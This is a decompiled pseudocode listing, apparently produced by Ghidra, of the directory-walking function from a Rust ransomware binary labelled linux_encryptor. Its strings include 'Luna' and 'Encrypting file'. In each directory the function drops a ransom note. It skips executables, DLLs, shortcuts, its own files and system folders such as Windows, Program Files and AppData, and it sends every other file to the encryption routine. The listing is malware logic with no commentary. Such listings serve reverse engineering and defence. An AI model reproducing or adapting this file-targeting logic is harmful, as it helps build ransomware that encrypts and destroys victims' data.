void _ZN15linux_encryptor5files8walk_dir17h3bbd2a8a81e3b38eE(undefined8 *param_1)

{
  code *pcVar1;
  undefined **ppuVar2;
  char cVar3;
  byte bVar4;
  undefined uVar5;
  undefined *puVar6;
  long lVar7;
  undefined auVar8 [16];
  undefined **local_138;
  undefined **local_130;
  code *pcStack_128;
  undefined ***local_118;
  undefined8 local_110;
  undefined *local_108;
  long lStack_100;
  long local_f8;
  undefined *local_f0;
  long local_e8;
  long local_e0;
  undefined *local_d8;
  long lStack_d0;
  long local_c8;
  undefined **local_c0;
  undefined **local_b8;
  undefined8 uStack_b0;
  undefined4 local_a8;
  undefined4 uStack_a4;
  undefined4 uStack_a0;
  undefined4 uStack_9c;
  undefined4 local_98;
  undefined4 uStack_94;
  undefined4 uStack_90;
  undefined4 uStack_8c;
  undefined *local_80;
  undefined **local_78;
  code *pcStack_70;
  undefined **local_60;
  undefined4 uStack_58;
  undefined4 uStack_54;
  undefined4 local_50;
  undefined4 uStack_4c;
  undefined4 uStack_48;
  undefined4 uStack_44;
  undefined4 local_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 uStack_34;
  
  _ZN15linux_encryptor5files11create_note17hd3c91fc90c0b0684E();
  auVar8 = (*(code *)PTR_readdir_00177ac0)(*param_1,param_1[2]);
  local_c0 = auVar8._8_8_;
  if (auVar8._0_8_ == 0) {
    while( true ) {
                    /* try { // try from 0010bd68 to 0010bd7a has its CatchHandler @ 0010c9c2 */
      (*(code *)PTR_next_00177b60)(&local_60,&local_c0);
      if ((int)local_60 == 2) break;
      local_98 = local_40;
      uStack_94 = uStack_3c;
      uStack_90 = uStack_38;
      uStack_8c = uStack_34;
      local_a8 = local_50;
      uStack_a4 = uStack_4c;
      uStack_a0 = uStack_48;
      uStack_9c = uStack_44;
      local_b8 = local_60;
      uStack_b0 = (code *)CONCAT44(uStack_54,uStack_58);
      if (local_60 != (undefined **)0x0) {
        local_138 = (undefined **)&uStack_b0;
                    /* try { // try from 0010c768 to 0010c78a has its CatchHandler @ 0010c9c7 */
        (*(code *)PTR_unwrap_failed_00177f80)
                  ("called `Result::unwrap()` on an `Err` value",0x2b,&local_138,
                   &
                   PTR__ZN4core3ptr46drop_in_place_LT__RF_std__io__error__Error_GT_17h40a085cd5c4345bbE_00173e90
                   ,&PTR_s_src_files_rs_00174180);
        goto LAB_0010c8d1;
      }
                    /* try { // try from 0010bdc8 to 0010bdd0 has its CatchHandler @ 0010c9c9 */
      std::fs::DirEntry::path();
      ppuVar2 = local_138;
                    /* try { // try from 0010bdda to 0010bde2 has its CatchHandler @ 0010c9b5 */
      cVar3 = (*(code *)PTR_is_dir_00177b08)(local_138,pcStack_128);
      if (local_130 != (undefined **)0x0) {
        std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
      }
      if (cVar3 == '\0') {
        if (local_b8 != (undefined **)0x0) {
          local_138 = (undefined **)&uStack_b0;
          (*(code *)PTR_unwrap_failed_00177f80)
                    ("called `Result::unwrap()` on an `Err` value",0x2b,&local_138,
                     &
                     PTR__ZN4core3ptr46drop_in_place_LT__RF_std__io__error__Error_GT_17h40a085cd5c4345bbE_00173e90
                     ,&PTR_s_src_files_rs_001741c8);
          goto LAB_0010c8d1;
        }
                    /* try { // try from 0010be6f to 0010be77 has its CatchHandler @ 0010c9c9 */
        std::fs::DirEntry::path();
        ppuVar2 = local_138;
                    /* try { // try from 0010be81 to 0010be89 has its CatchHandler @ 0010c991 */
        cVar3 = (*(code *)PTR_is_file_00177b70)(local_138,pcStack_128);
        if (local_130 != (undefined **)0x0) {
          std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
        }
        if (cVar3 != '\0') {
          if (local_b8 != (undefined **)0x0) {
            local_138 = (undefined **)&uStack_b0;
                    /* try { // try from 0010c81d to 0010c83f has its CatchHandler @ 0010c9c7 */
            (*(code *)PTR_unwrap_failed_00177f80)
                      ("called `Result::unwrap()` on an `Err` value",0x2b,&local_138,
                       &
                       PTR__ZN4core3ptr46drop_in_place_LT__RF_std__io__error__Error_GT_17h40a085cd5c4345bbE_00173e90
                       ,&PTR_s_src_files_rs_001741e0);
            goto LAB_0010c8d1;
          }
                    /* try { // try from 0010beb9 to 0010bec1 has its CatchHandler @ 0010c9c9 */
          std::fs::DirEntry::path();
          ppuVar2 = local_138;
                    /* try { // try from 0010becb to 0010bed3 has its CatchHandler @ 0010c95c */
          auVar8 = (*(code *)PTR_to_str_00177cb0)(local_138,pcStack_128);
          lVar7 = auVar8._8_8_;
          if (auVar8._0_8_ == 0) {
                    /* try { // try from 0010c845 to 0010c85d has its CatchHandler @ 0010c96d */
            (*(code *)PTR_panic_00177a90)
                      ("called `Option::unwrap()` on a `None` value",0x2b,
                       &PTR_s_src_files_rs_001741f8);
            goto LAB_0010c8d1;
          }
          if (lVar7 == 0) {
            puVar6 = &DAT_00000001;
          }
          else {
            puVar6 = (undefined *)(*(code *)PTR___rust_alloc_00177c88)(lVar7,1);
            if (puVar6 == (undefined *)0x0) {
                    /* try { // try from 0010c860 to 0010c86d has its CatchHandler @ 0010c938 */
              (*(code *)PTR_handle_alloc_error_00177ae0)(lVar7,1);
              goto LAB_0010c8d1;
            }
          }
          (*(code *)PTR_memcpy_00177fa8)(puVar6,auVar8._0_8_,lVar7);
          local_108 = puVar6;
          lStack_100 = lVar7;
          local_f8 = lVar7;
          if (local_130 != (undefined **)0x0) {
            std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
          }
                    /* try { // try from 0010c256 to 0010c266 has its CatchHandler @ 0010c98c */
          (*(code *)PTR_to_lowercase_00177f60)(&local_d8,local_108,local_f8);
          puVar6 = local_d8;
                    /* try { // try from 0010c271 to 0010c284 has its CatchHandler @ 0010c971 */
          cVar3 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                            (".ini",4,local_d8,local_c8);
          if (cVar3 == '\0') {
                    /* try { // try from 0010c373 to 0010c37b has its CatchHandler @ 0010c971 */
            (*(code *)PTR_to_lowercase_00177f60)(&local_138,local_108,local_f8);
            ppuVar2 = local_138;
                    /* try { // try from 0010c385 to 0010c398 has its CatchHandler @ 0010c926 */
            cVar3 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                              (".exe",4,local_138,pcStack_128);
            if (local_130 != (undefined **)0x0) {
              std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
            }
            if (cVar3 == '\0') {
                    /* try { // try from 0010c3c4 to 0010c3cc has its CatchHandler @ 0010c971 */
              (*(code *)PTR_to_lowercase_00177f60)(&local_138,local_108,local_f8);
              ppuVar2 = local_138;
                    /* try { // try from 0010c3d6 to 0010c3e9 has its CatchHandler @ 0010c901 */
              cVar3 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                                (".dll",4,local_138,pcStack_128);
              if (local_130 != (undefined **)0x0) {
                std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
              }
              if (cVar3 == '\0') {
                    /* try { // try from 0010c411 to 0010c419 has its CatchHandler @ 0010c971 */
                (*(code *)PTR_to_lowercase_00177f60)(&local_138,local_108,local_f8);
                ppuVar2 = local_138;
                    /* try { // try from 0010c423 to 0010c436 has its CatchHandler @ 0010c8fd */
                cVar3 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                                  (".lnk",4,local_138,pcStack_128);
                if (local_130 != (undefined **)0x0) {
                  std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
                }
                if (cVar3 == '\0') {
                    /* try { // try from 0010c47b to 0010c485 has its CatchHandler @ 0010c971 */
                  (*(code *)PTR_to_lowercase_00177f60)(&local_f0,local_108,local_f8);
                  lVar7 = local_e0;
                  local_80 = local_f0;
                    /* try { // try from 0010c498 to 0010c4ca has its CatchHandler @ 0010c8e6 */
                  (*(code *)PTR_from_utf8_00177ae8)(&local_138,"Luna",4);
                  if (local_138 != (undefined **)0x0) {
                    local_78 = local_130;
                    pcStack_70 = pcStack_128;
                    /* try { // try from 0010c8a9 to 0010c8d0 has its CatchHandler @ 0010c8e4 */
                    (*(code *)PTR_unwrap_failed_00177f80)
                              ("called `Result::unwrap()` on an `Err` value",0x2b,&local_78,
                               &
                               PTR__ZN4core3ptr46drop_in_place_LT__RF_std__io__error__Error_GT_17h40a085cd5c4345bbE_00173eb0
                               ,&PTR_s_src_files_rs_00174210);
                    goto LAB_0010c8d1;
                  }
                  (*(code *)PTR_to_lowercase_00177f60)(&local_138,local_130,pcStack_128);
                  ppuVar2 = local_138;
                    /* try { // try from 0010c4d4 to 0010c4e6 has its CatchHandler @ 0010c8d7 */
                  bVar4 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                                    (local_138,pcStack_128,local_80,lVar7);
                  if (local_130 != (undefined **)0x0) {
                    std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
                  }
                  if (local_e8 != 0) {
                    std::alloc::__default_lib_allocator::__rust_dealloc(local_80);
                  }
                  bVar4 = bVar4 ^ 1;
                  goto joined_r0x0010c466;
                }
              }
            }
            bVar4 = 0;
          }
          else {
            bVar4 = 0;
          }
joined_r0x0010c466:
          if (lStack_d0 != 0) {
            std::alloc::__default_lib_allocator::__rust_dealloc(puVar6);
          }
          if (bVar4 != 0) {
            if (local_b8 != (undefined **)0x0) {
              local_138 = (undefined **)&uStack_b0;
                    /* try { // try from 0010c874 to 0010c896 has its CatchHandler @ 0010c91e */
              (*(code *)PTR_unwrap_failed_00177f80)
                        ("called `Result::unwrap()` on an `Err` value",0x2b,&local_138,
                         &
                         PTR__ZN4core3ptr46drop_in_place_LT__RF_std__io__error__Error_GT_17h40a085cd5c4345bbE_00173e90
                         ,&PTR_s_src_files_rs_00174248);
LAB_0010c8d1:
                    /* WARNING: Does not return */
              pcVar1 = (code *)invalidInstructionException();
              (*pcVar1)();
            }
                    /* try { // try from 0010c2c0 to 0010c2ca has its CatchHandler @ 0010c98c */
            std::fs::DirEntry::path();
            puVar6 = local_f0;
            local_d8 = local_f0;
            lStack_d0 = local_e0;
            local_78 = &local_d8;
            pcStack_70 = std::path::fmt;
            local_138 = &PTR_s_Encrypting_file__00174228;
            local_130 = (undefined **)0x2;
            pcStack_128 = (code *)0x0;
            local_118 = &local_78;
            local_110 = 1;
                    /* try { // try from 0010c32e to 0010c336 has its CatchHandler @ 0010c91c */
            (*(code *)PTR__print_00177f40)(&local_138);
            if (local_e8 != 0) {
              std::alloc::__default_lib_allocator::__rust_dealloc(puVar6);
            }
                    /* try { // try from 0010c34c to 0010c355 has its CatchHandler @ 0010c98c */
            _ZN15linux_encryptor5files8add_file17h9f8ecb31ebca83c0E(&local_108);
          }
          goto joined_r0x0010c35e;
        }
      }
      else {
        if (local_b8 != (undefined **)0x0) {
          local_138 = (undefined **)&uStack_b0;
                    /* try { // try from 0010c7b2 to 0010c800 has its CatchHandler @ 0010c9c7 */
          (*(code *)PTR_unwrap_failed_00177f80)
                    ("called `Result::unwrap()` on an `Err` value",0x2b,&local_138,
                     &
                     PTR__ZN4core3ptr46drop_in_place_LT__RF_std__io__error__Error_GT_17h40a085cd5c4345bbE_00173e90
                     ,&PTR_s_src_files_rs_00174198);
          goto LAB_0010c8d1;
        }
                    /* try { // try from 0010be0e to 0010be16 has its CatchHandler @ 0010c9c9 */
        std::fs::DirEntry::path();
        ppuVar2 = local_138;
                    /* try { // try from 0010be20 to 0010be28 has its CatchHandler @ 0010c97b */
        auVar8 = (*(code *)PTR_to_str_00177cb0)(local_138,pcStack_128);
        lVar7 = auVar8._8_8_;
        if (auVar8._0_8_ == 0) {
                    /* try { // try from 0010c790 to 0010c7a8 has its CatchHandler @ 0010c993 */
          (*(code *)PTR_panic_00177a90)
                    ("called `Option::unwrap()` on a `None` value",0x2b,&PTR_s_src_files_rs_001741b0
                    );
          goto LAB_0010c8d1;
        }
        if (lVar7 == 0) {
          puVar6 = &DAT_00000001;
        }
        else {
          puVar6 = (undefined *)(*(code *)PTR___rust_alloc_00177c88)(lVar7,1);
          if (puVar6 == (undefined *)0x0) {
                    /* try { // try from 0010c806 to 0010c813 has its CatchHandler @ 0010c96f */
            (*(code *)PTR_handle_alloc_error_00177ae0)(lVar7,1);
            goto LAB_0010c8d1;
          }
        }
        (*(code *)PTR_memcpy_00177fa8)(puVar6,auVar8._0_8_,lVar7);
                    /* try { // try from 0010bf2e to 0010bf3d has its CatchHandler @ 0010c97d */
        local_f0 = puVar6;
        local_e8 = lVar7;
        local_e0 = lVar7;
        (*(code *)PTR_clone_00177740)(&local_d8,&local_f0);
        if (lStack_d0 == local_c8) {
                    /* try { // try from 0010bf4d to 0010bf5b has its CatchHandler @ 0010c95e */
          _ZN5alloc7raw_vec19RawVec_LT_T_C_A_GT_7reserve21do_reserve_and_handle17h0efe5460ba49e6e2E
                    (&local_d8,local_c8,1);
        }
        local_d8[local_c8] = 0x5c;
        local_f8 = local_c8 + 1;
        local_108 = local_d8;
        lStack_100 = lStack_d0;
        if (local_e8 != 0) {
          std::alloc::__default_lib_allocator::__rust_dealloc(local_f0);
        }
        if (local_130 != (undefined **)0x0) {
          std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
        }
                    /* try { // try from 0010bfb3 to 0010bfbd has its CatchHandler @ 0010c997 */
        (*(code *)PTR_to_lowercase_00177f60)(&local_f0,local_108,local_f8);
        puVar6 = local_f0;
                    /* try { // try from 0010bfc8 to 0010bff6 has its CatchHandler @ 0010c99c */
        cVar3 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                          ("openserver",10,local_f0,local_e0);
        if (cVar3 == '\0') {
          (*(code *)PTR_to_lowercase_00177f60)(&local_138,local_108,local_f8);
          ppuVar2 = local_138;
                    /* try { // try from 0010c000 to 0010c013 has its CatchHandler @ 0010c94f */
          cVar3 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                            ("windows",7,local_138,pcStack_128);
          if (local_130 != (undefined **)0x0) {
            std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
          }
          if (cVar3 != '\0') goto LAB_0010c170;
                    /* try { // try from 0010c03e to 0010c046 has its CatchHandler @ 0010c99c */
          (*(code *)PTR_to_lowercase_00177f60)(&local_138,local_108,local_f8);
          ppuVar2 = local_138;
                    /* try { // try from 0010c050 to 0010c063 has its CatchHandler @ 0010c91a */
          cVar3 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                            ("program files",0xd,local_138,pcStack_128);
          if (local_130 != (undefined **)0x0) {
            std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
          }
          if (cVar3 != '\0') goto LAB_0010c170;
                    /* try { // try from 0010c08e to 0010c096 has its CatchHandler @ 0010c99c */
          (*(code *)PTR_to_lowercase_00177f60)(&local_138,local_108,local_f8);
          ppuVar2 = local_138;
                    /* try { // try from 0010c0a0 to 0010c0b3 has its CatchHandler @ 0010c903 */
          cVar3 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                            ("recycle.bin",0xb,local_138,pcStack_128);
          if (local_130 != (undefined **)0x0) {
            std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
          }
          if (cVar3 != '\0') goto LAB_0010c170;
                    /* try { // try from 0010c0de to 0010c0e6 has its CatchHandler @ 0010c99c */
          (*(code *)PTR_to_lowercase_00177f60)(&local_138,local_108,local_f8);
          ppuVar2 = local_138;
                    /* try { // try from 0010c0f0 to 0010c103 has its CatchHandler @ 0010c8ff */
          cVar3 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                            ("programdata",0xb,local_138,pcStack_128);
          if (local_130 != (undefined **)0x0) {
            std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
          }
          if (cVar3 != '\0') goto LAB_0010c170;
                    /* try { // try from 0010c12a to 0010c132 has its CatchHandler @ 0010c99c */
          (*(code *)PTR_to_lowercase_00177f60)(&local_138,local_108,local_f8);
          ppuVar2 = local_138;
                    /* try { // try from 0010c13c to 0010c14f has its CatchHandler @ 0010c8d5 */
          cVar3 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                            ("appdata",7,local_138,pcStack_128);
          if (local_130 != (undefined **)0x0) {
            std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
          }
          if (cVar3 != '\0') goto LAB_0010c170;
                    /* try { // try from 0010c52c to 0010c534 has its CatchHandler @ 0010c99c */
          (*(code *)PTR_to_lowercase_00177f60)(&local_138,local_108,local_f8);
          ppuVar2 = local_138;
                    /* try { // try from 0010c53e to 0010c551 has its CatchHandler @ 0010c8d3 */
          bVar4 = _ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E
                            ("all users",9,local_138,pcStack_128);
          if (local_130 != (undefined **)0x0) {
            std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar2);
          }
          bVar4 = bVar4 ^ 1;
        }
        else {
LAB_0010c170:
          bVar4 = 0;
        }
        if (local_e8 != 0) {
          std::alloc::__default_lib_allocator::__rust_dealloc(puVar6);
        }
        if (bVar4 != 0) {
                    /* try { // try from 0010c18b to 0010c194 has its CatchHandler @ 0010c997 */
          _ZN15linux_encryptor5files8walk_dir17h3bbd2a8a81e3b38eE(&local_108);
        }
joined_r0x0010c35e:
        if (lStack_100 != 0) {
          std::alloc::__default_lib_allocator::__rust_dealloc(local_108);
        }
      }
      if (local_b8 == (undefined **)0x0) {
        LOCK();
        *(long *)uStack_b0 = *(long *)uStack_b0 + -1;
        UNLOCK();
        if (*(long *)uStack_b0 == 0) {
                    /* try { // try from 0010c1d1 to 0010c1d8 has its CatchHandler @ 0010c93a */
          _ZN5alloc4sync12Arc_LT_T_GT_9drop_slow17hbfdcf0b3892a7d2aE(&uStack_b0);
        }
        *(undefined *)CONCAT44(uStack_94,local_98) = 0;
        if (CONCAT44(uStack_8c,uStack_90) != 0) {
          std::alloc::__default_lib_allocator::__rust_dealloc((void *)CONCAT44(uStack_94,local_98));
        }
      }
      else {
                    /* try { // try from 0010bd60 to 0010bd67 has its CatchHandler @ 0010c995 */
        _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E(&uStack_b0);
      }
    }
    LOCK();
    *local_c0 = *local_c0 + -1;
    UNLOCK();
    if (*local_c0 == (undefined *)0x0) {
      _ZN5alloc4sync12Arc_LT_T_GT_9drop_slow17hbfdcf0b3892a7d2aE(&local_c0);
    }
  }
  else {
    local_60 = local_c0;
    switch(auVar8._8_4_ & 3) {
    case 0:
      uVar5 = *(undefined *)(local_c0 + 2);
      break;
    case 1:
      uVar5 = *(undefined *)((long)local_c0 + 0xf);
      break;
    case 2:
                    /* try { // try from 0010c5a2 to 0010c62f has its CatchHandler @ 0010c905 */
      uVar5 = (*(code *)PTR_decode_error_kind_00177a30)(auVar8._12_4_);
      break;
    case 3:
      if (auVar8._12_4_ < 0x29) {
                    /* WARNING: Could not recover jumptable at 0x0010c5cb. Too many branches */
                    /* WARNING: Treating indirect jump as call */
        (*(code *)(&DAT_001530f4 + *(int *)(&DAT_001530f4 + ((ulong)local_c0 >> 0x20) * 4)))();
        return;
      }
      uVar5 = 0x29;
    }
    local_f0 = (undefined *)CONCAT71(local_f0._1_7_,uVar5);
    local_b8 = &local_f0;
    uStack_b0 = std::io::error::fmt;
    local_138 = &PTR_s_Error__00174160;
    local_130 = (undefined **)0x2;
    pcStack_128 = (code *)0x0;
    local_118 = &local_b8;
    local_110 = 1;
    (*(code *)PTR__print_00177f40)(&local_138);
    _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E(&local_60);
  }
  return;
}